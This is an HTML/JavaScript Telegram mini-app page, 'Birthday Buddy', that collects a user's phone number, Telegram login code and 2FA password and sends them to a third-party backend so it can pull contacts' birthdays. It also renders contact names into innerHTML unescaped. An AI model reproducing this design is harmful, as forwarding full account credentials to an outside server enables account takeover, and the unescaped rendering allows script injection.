<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Birthday Buddy ‚Äî Ultra Fast Import</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: white;
        }

        .container {
            max-width: 380px;
            width: 100%;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 28px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .emoji {
            font-size: 56px;
            text-align: center;
            margin-bottom: 16px;
            animation: bounce 2s ease infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            font-size: 14px;
            opacity: 0.85;
            text-align: center;
            margin-bottom: 24px;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
            animation: fadeIn 0.25s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: none;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            margin-bottom: 12px;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.25);
        }

        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            background: white;
            color: #667eea;
            cursor: pointer;
            transition: transform 0.2s;
            margin-bottom: 8px;
        }

        button:active {
            transform: scale(0.98);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        button.secondary {
            background: transparent;
            color: white;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .loader {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 16px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status {
            text-align: center;
            padding: 10px;
            border-radius: 8px;
            margin: 12px 0;
            font-size: 13px;
            font-weight: 500;
        }

        .status.error {
            background: rgba(239, 68, 68, 0.25);
        }

        .status.success {
            background: rgba(34, 197, 94, 0.25);
        }

        .status.info {
            background: rgba(59, 130, 246, 0.25);
        }

        .stats {
            text-align: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 16px;
            margin-bottom: 16px;
        }

        .stats-number {
            font-size: 52px;
            font-weight: 700;
            margin-bottom: 4px;
            background: linear-gradient(135deg, #fff, rgba(255,255,255,0.7));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stats-label {
            font-size: 14px;
            opacity: 0.9;
        }

        .contact-list {
            max-height: 280px;
            overflow-y: auto;
            margin: 16px 0;
            padding: 8px;
            background: rgba(0, 0, 0, 0.15);
            border-radius: 12px;
        }

        .contact-item {
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            margin-bottom: 6px;
        }

        .contact-name {
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 2px;
        }

        .contact-birthday {
            font-size: 12px;
            opacity: 0.8;
        }

        .progress-text {
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            margin: 16px 0;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Step 1: Phone -->
        <div id="step-phone" class="step active">
            <div class="emoji">üéÇ</div>
            <h1>Import Birthdays</h1>
            <p class="subtitle">Ultra-fast import from Telegram</p>
            
            <input 
                type="tel" 
                id="phone" 
                placeholder="+1234567890" 
                autocomplete="tel"
            />

            <button id="sendCodeBtn" onclick="sendCode()">Send Code</button>
            
            <div id="phoneStatus" class="status hidden"></div>
        </div>

        <!-- Step 2: Code -->
        <div id="step-code" class="step">
            <div class="emoji">üì±</div>
            <h1>Enter Code</h1>
            <p class="subtitle">Check Telegram for the code</p>
            
            <input 
                type="text" 
                id="code" 
                placeholder="12345" 
                autocomplete="one-time-code"
                maxlength="5"
            />

            <button id="verifyBtn" onclick="verifyCode()">Verify & Import</button>
            <button class="secondary" onclick="backToPhone()">Back</button>
            
            <div id="codeStatus" class="status hidden"></div>
        </div>

        <!-- Step 2.5: Password -->
        <div id="step-password" class="step">
            <div class="emoji" id="pwdEmoji">üîê</div>
            <h1 id="pwdTitle">2FA Password</h1>
            <p class="subtitle" id="pwdSubtitle">Enter your Telegram password</p>
            
            <input 
                type="password" 
                id="password" 
                placeholder="Your password" 
                autocomplete="current-password"
            />

            <button id="passwordBtn" onclick="verifyPassword()">Verify</button>
            <button class="secondary" id="pwdBackBtn" onclick="backToPhone()">Back</button>
            
            <div class="progress-text hidden" id="progressText">0%</div>
            <div class="loader hidden" id="passwordLoader"></div>
            <div id="passwordStatus" class="status hidden"></div>
        </div>

        <!-- Step 3: Success -->
        <div id="step-success" class="step">
            <div class="emoji">‚úÖ</div>
            <h1>Ready!</h1>
            <p class="subtitle">Tap to import to Birthday Buddy</p>
            
            <div class="stats">
                <div class="stats-number" id="contactCount">0</div>
                <div class="stats-label">Birthdays Found</div>
            </div>

            <div class="contact-list" id="contactList"></div>

            <button onclick="sendToiOS()">Import Now</button>
            <button class="secondary" onclick="location.reload()">Cancel</button>
        </div>
    </div>

    <script>
        const BACKEND_URL = 'https://birthdaybuddy-backend-production.up.railway.app';
        
        let sessionId = null;
        let phoneNumber = null;
        let contacts = [];

        // Initialize
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }

        // Send Code - ULTRA FAST
        async function sendCode() {
            const phone = document.getElementById('phone').value.trim();

            if (!phone.match(/^\+\d{7,15}$/)) {
                showStatus('phoneStatus', 'Invalid phone format (e.g., +1234567890)', 'error');
                return;
            }

            phoneNumber = phone;
            setLoading('sendCodeBtn', true);
            showStatus('phoneStatus', 'Sending...', 'info');

            try {
                const response = await fetch(`${BACKEND_URL}/api/auth/send-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    sessionId = data.sessionId;
                    showStatus('phoneStatus', 'Code sent! ‚úì', 'success');
                    
                    setTimeout(() => showStep('step-code'), 1500);
                } else {
                    throw new Error(data.error || 'Failed to send code');
                }

            } catch (error) {
                showStatus('phoneStatus', error.message, 'error');
                setLoading('sendCodeBtn', false);
            }
        }

        // Verify Code - OPTIMIZED
        async function verifyCode() {
            const code = document.getElementById('code').value.replace(/[\s\-]/g, '');

            if (code.length < 5) {
                showStatus('codeStatus', 'Enter 5-digit code', 'error');
                return;
            }

            setLoading('verifyBtn', true);
            showStatus('codeStatus', 'Verifying...', 'info');

            try {
                const response = await fetch(`${BACKEND_URL}/api/auth/verify-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, code, phone: phoneNumber })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    if (data.passwordRequired) {
                        showStatus('codeStatus', 'Code verified! Enter 2FA password', 'success');
                        setTimeout(() => showStep('step-password'), 1000);
                    } else if (data.processing) {
                        showStatus('codeStatus', 'Processing...', 'success');
                        showProcessingUI();
                        startUltraFastPolling(sessionId);
                    } else {
                        contacts = data.contacts;
                        showSuccess(data.count);
                    }
                } else {
                    throw new Error(data.error || 'Invalid code');
                }

            } catch (error) {
                showStatus('codeStatus', error.message, 'error');
                setLoading('verifyBtn', false);
            }
        }

        // Verify Password
        async function verifyPassword() {
            const password = document.getElementById('password').value.trim();

            if (!password) {
                showStatus('passwordStatus', 'Enter password', 'error');
                return;
            }

            setLoading('passwordBtn', true);
            showStatus('passwordStatus', 'Verifying...', 'info');

            try {
                const response = await fetch(`${BACKEND_URL}/api/auth/verify-password`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, password })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    if (data.processing) {
                        showStatus('passwordStatus', 'Processing...', 'success');
                        showProcessingUI();
                        startUltraFastPolling(sessionId);
                    } else {
                        contacts = data.contacts;
                        showSuccess(data.count);
                    }
                } else {
                    throw new Error(data.error || 'Invalid password');
                }

            } catch (error) {
                showStatus('passwordStatus', error.message, 'error');
                setLoading('passwordBtn', false);
            }
        }

        // ULTRA FAST POLLING - 250ms intervals!
        function startUltraFastPolling(sessionId) {
            let lastProgress = 0;
            
            const poll = setInterval(async () => {
                try {
                    const response = await fetch(`${BACKEND_URL}/api/progress/${sessionId}`);
                    const progress = await response.json();

                    if (progress.status === 'complete') {
                        clearInterval(poll);
                        contacts = progress.contacts || [];
                        showSuccess(progress.found);
                    } else if (progress.status === 'error') {
                        clearInterval(poll);
                        showStatus('passwordStatus', progress.error, 'error');
                        hideProcessingUI();
                    } else if (progress.status === 'processing') {
                        // Update progress instantly
                        if (progress.percent !== lastProgress) {
                            updateProgress(progress.percent, progress.found);
                            lastProgress = progress.percent;
                        }
                    }
                } catch (error) {
                    console.error('Poll error:', error);
                }
            }, 250); // 250ms = 4x faster than before!
        }

        // Processing UI
        function showProcessingUI() {
            showStep('step-password');
            document.getElementById('pwdEmoji').textContent = 'üöÄ';
            document.getElementById('pwdTitle').textContent = 'Ultra Fast Import';
            document.getElementById('pwdSubtitle').textContent = 'Processing at lightning speed...';
            document.getElementById('password').classList.add('hidden');
            document.getElementById('passwordBtn').classList.add('hidden');
            document.getElementById('pwdBackBtn').classList.add('hidden');
            document.getElementById('passwordLoader').classList.remove('hidden');
            document.getElementById('progressText').classList.remove('hidden');
        }

        function hideProcessingUI() {
            document.getElementById('passwordLoader').classList.add('hidden');
            document.getElementById('password').classList.remove('hidden');
            document.getElementById('passwordBtn').classList.remove('hidden');
            document.getElementById('pwdBackBtn').classList.remove('hidden');
        }

        function updateProgress(percent, found) {
            const progressText = document.getElementById('progressText');
            progressText.textContent = `${percent}%`;
            
            if (found > 0) {
                showStatus('passwordStatus', `üéÇ Found ${found} birthdays!`, 'success');
            } else {
                showStatus('passwordStatus', `Processing ${percent}%...`, 'info');
            }
        }

        function showSuccess(count) {
            showStatus('passwordStatus', `Complete! Found ${count} üéâ`, 'success');
            setTimeout(() => {
                displayContacts();
                showStep('step-success');
            }, 1000);
        }

        // Display contacts
        function displayContacts() {
            document.getElementById('contactCount').textContent = contacts.length;

            const today = new Date();
            const sorted = contacts.sort((a, b) => {
                const dateA = new Date(a.birthday);
                const dateB = new Date(b.birthday);
                dateA.setFullYear(today.getFullYear());
                dateB.setFullYear(today.getFullYear());
                if (dateA < today) dateA.setFullYear(today.getFullYear() + 1);
                if (dateB < today) dateB.setFullYear(today.getFullYear() + 1);
                return dateA - dateB;
            });

            const listEl = document.getElementById('contactList');
            listEl.innerHTML = '';

            sorted.slice(0, 10).forEach(contact => {
                const item = document.createElement('div');
                item.className = 'contact-item';
                
                const date = new Date(contact.birthday);
                const dateStr = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
                
                item.innerHTML = `
                    <div class="contact-name">${contact.name}</div>
                    <div class="contact-birthday">üéÇ ${dateStr}</div>
                `;
                listEl.appendChild(item);
            });

            if (contacts.length > 10) {
                const more = document.createElement('div');
                more.style.textAlign = 'center';
                more.style.padding = '8px';
                more.style.opacity = '0.7';
                more.textContent = `+ ${contacts.length - 10} more`;
                listEl.appendChild(more);
            }
        }

        // Send to iOS
        function sendToiOS() {
            if (contacts.length === 0) return;

            try {
                const jsonString = JSON.stringify(contacts);
                const base64Data = btoa(unescape(encodeURIComponent(jsonString)));
                const deepLink = `birthdaybuddy://import?data=${base64Data}`;
                
                window.location.href = deepLink;
                
                setTimeout(() => {
                    alert('‚úÖ Check Birthday Buddy app!');
                }, 1000);
                
            } catch (error) {
                alert(`Error: ${error.message}`);
            }
        }

        // Helpers
        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            document.getElementById(stepId).classList.add('active');
        }

        function backToPhone() {
            showStep('step-phone');
            document.getElementById('phone').value = phoneNumber || '';
            document.getElementById('code').value = '';
            setLoading('sendCodeBtn', false);
        }

        function showStatus(id, message, type) {
            const el = document.getElementById(id);
            el.textContent = message;
            el.className = `status ${type}`;
            el.classList.remove('hidden');
            
            if (type !== 'info') {
                setTimeout(() => el.classList.add('hidden'), 4000);
            }
        }

        function setLoading(btnId, loading) {
            document.getElementById(btnId).disabled = loading;
        }

        // Auto-focus & Enter handlers
        window.addEventListener('load', () => {
            document.getElementById('phone').focus();
        });

        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('code').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verifyCode();
        });

        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verifyPassword();
        });
    </script>
</body>
</html>
